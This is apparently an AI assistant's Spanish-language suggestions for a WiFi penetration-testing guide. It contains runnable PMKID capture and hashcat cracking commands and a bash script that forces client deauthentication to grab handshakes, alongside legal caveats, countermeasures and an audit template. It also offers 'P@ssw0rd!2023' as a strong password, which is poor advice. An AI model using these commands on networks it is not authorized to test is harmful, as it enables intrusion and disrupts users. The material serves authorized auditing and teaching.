
> ### **Mejoras y Ampliaciones para tu Guía**  
> 
> #### **1. Consideraciones Legales y Éticas (¡CRUCIAL!)**  
> - **Marco Legal:**  
>   - En España: Artículo 197 del Código Penal (delito de descubrimiento y revelación de secretos).  
>   - En México: Ley Federal de Delitos Informáticos (artículo 211 bis).  
>   - Siempre incluye una cláusula: *"Esta prueba se realizó con autorización escrita del propietario de la red. El uso no autorizado constituye delito."*  
> 
> - **Checklist de Autorización:**  
>   - ✅ Permiso por escrito con fecha y alcance.  
>   - ✅ Delimitación de objetivos (ej: solo probar WPA2, no afectar servicios).  
>   - ✅ Horario acordado (evitar horas pico en empresas).  
> 
> #### **2. Técnicas Avanzadas (Para Auditorías Profesionales)**  
> ##### **A. Ataques a PMKID (Más Eficiente que Handshake)**  
> **Herramienta:** `hcxtools` + `hashcat`  
> ```bash
> # Capturar PMKID (no necesita clientes conectados)
> sudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
> 
> # Convertir a formato hashcat
> hcxpcapngtool -o hash.hc22000 dump.pcapng
> 
> # Crackear
> hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
> ```
> **Ventaja:** Funciona incluso si no hay clientes conectados.  
> 
> ##### **B. Ataque a WPA3 (SAE - Simultaneous Authentication of Equals)**  
> **Herramienta:** `wpa3-sae-bruteforce` (experimental)  
> ```bash
> # Requiere tarjeta compatible con modo monitor y SAE
> sudo wpa3-sae-bruteforce -i wlan0mon -b <BSSID> -w diccionario.txt
> ```
> **Nota:** WPA3 es robusto, pero implementaciones débiles (contraseñas cortas) son vulnerables.  
> 
> ##### **C. Análisis de Tráfico con Wireshark**  
> ```bash
> # Capturar paquetes en tiempo real
> sudo wireshark -i wlan0mon -k -f "wlan addr <BSSID>"
> ```
> **Filtros útiles:**  
> - `eapol` (para handshakes).  
> - `wps` (para ataques WPS).  
> 
> #### **3. Automatización con Scripts (Ahorra Tiempo)**  
> ##### **Script para Automatizar Captura de Handshake:**  
> ```bash
> #!/bin/bash
> # auto-handshake.sh
> 
> if [ "$EUID" -ne 0 ]; then 
>     echo "Ejecuta como root: sudo $0"
>     exit 1
> fi
> 
> echo "Poniendo interfaz en modo monitor..."
> airmon-ng start wlan0 > /dev/null
> 
> echo "Escaneando redes... (Ctrl+C para salir)"
> airodump-ng wlan0mon
> 
> read -p "BSSID objetivo: " BSSID
> read -p "Canal: " CANAL
> 
> echo "Iniciando captura..."
> airodump-ng --bssid $BSSID -c $CANAL -w captura wlan0mon &
> 
> read -p "Presiona Enter para forzar reconexión..."
> aireplay-ng --deauth 10 -a $BSSID wlan0mon
> 
> echo "Esperando handshake... (Ctrl+C para terminar)"
> wait
> ```
> **Uso:** `sudo chmod +x auto-handshake.sh && sudo ./auto-handshake.sh`  
> 
> #### **4. Contramedidas (Cómo Proteger Redes)**  
> Incluye esto en tu informe final para demostrar valor:  
> 
> | **Vulnerabilidad** | **Solución**                                                                 |
> |---------------------|-----------------------------------------------------------------------------|
> | WPS activado        | Deshabilitar WPS en el router.                                              |
> | Contraseña débil    | Usar +12 caracteres con mayúsculas, números y símbolos (ej: `P@ssw0rd!2023`). |
> | WPA2/WPA3           | Actualizar firmware del router y usar WPA3-SAE.                            |
> | Evil Twin           | Habilitar "Protected Management Frames" (PMF) en el router.                |
> 
> #### **5. Herramientas Alternativas (Multiplataforma)**  
> - **Windows:**  
>   - `Acrylic WiFi` (análisis de redes).  
>   - `CommView for WiFi` (captura de paquetes).  
> - **Android:**  
>   - `WIBR+` (ataques de diccionario).  
>   - `NetHunter` (entorno Kali para móvil).  
> 
> #### **6. Casos de Uso Reales (Ejemplos Prácticos)**  
> - **Empresa:**  
>   *"Auditoría a red corporativa: Se detectó WPS activado en 3 routers. Se recomendó desactivarlo y se implementó WPA3. Se redujo el riesgo de acceso no autorizado en 90%."*  
> - **Hogar:**  
>   *"Red doméstica con contraseña '12345678'. Se demostró cómo crackearla en 2 minutos. Se cambió a una contraseña robusta y se deshabilitó WPS."*  
> 
> #### **7. Errores Comunes (¡Evítalos!)**  
> - ❌ Usar `airodump-ng` sin filtrar canal/BSSID (sobrecarga de datos).  
> - ❌ Olvidar detener `airmon-ng` después de la prueba (`sudo airmon-ng stop wlan0mon`).  
> - ❌ No verificar la compatibilidad de la tarjeta con modo monitor (usa `iw list`).  
> 
> ### **Plantilla para Informe de Auditoría**  
> ```markdown
> # Informe de Auditoría WiFi - [Fecha]  
> **Objetivo:** Evaluar seguridad de la red [Nombre_Red].  
> **Alcance:** Pruebas de penetración no intrusivas con autorización.  
> 
> ## Hallazgos Críticos  
> 1. **Vulnerabilidad:** WPS activado.  
>    - **Riesgo:** Alto (acceso en minutos con Reaver).  
>    - **Recomendación:** Deshabilitar WPS.  
> 
> 2. **Vulnerabilidad:** Contraseña WPA2 débil.  
>    - **Riesgo:** Medio (crackeada en 4 horas con diccionario).  
>    - **Recomendación:** Cambiar a contraseña robusta.  
> 
> ## Conclusión  
> La red presenta vulnerabilidades críticas. Implementar las contramedidas recomendadas reduce el riesgo a niveles aceptables.  
> 
> **Firma del Auditor:**  
> [Nombre]  
> [Certificaciones: CEH, OSCP, etc.]
> ```
> 
> ### **Recursos Adicionales**  
> - **Cursos:**  
>   - [Practical Ethical Hacking - TCM Security](https://tcm-security.com/practical-ethical-hacking-the-complete-course/)  
>   - [Wireless Attacks - eLearnSecurity](https://elearnsecurity.com/course/wireless_attacks)  
> - **Comunidad:**  
>   - Foro [HackTheBox](https://forum.hackthebox.com/) (retos WiFi).  
>   - Reddit [r/netsec](https://www.reddit.com/r/netsec/) (discusiones técnicas).  
> 
> ¡Con esto tus apuntes serán de nivel profesional! Si necesitas profundizar en algún área (ej: ataques a IoT en redes WiFi, análisis de firmware de routers), ¡avísame! 🚀
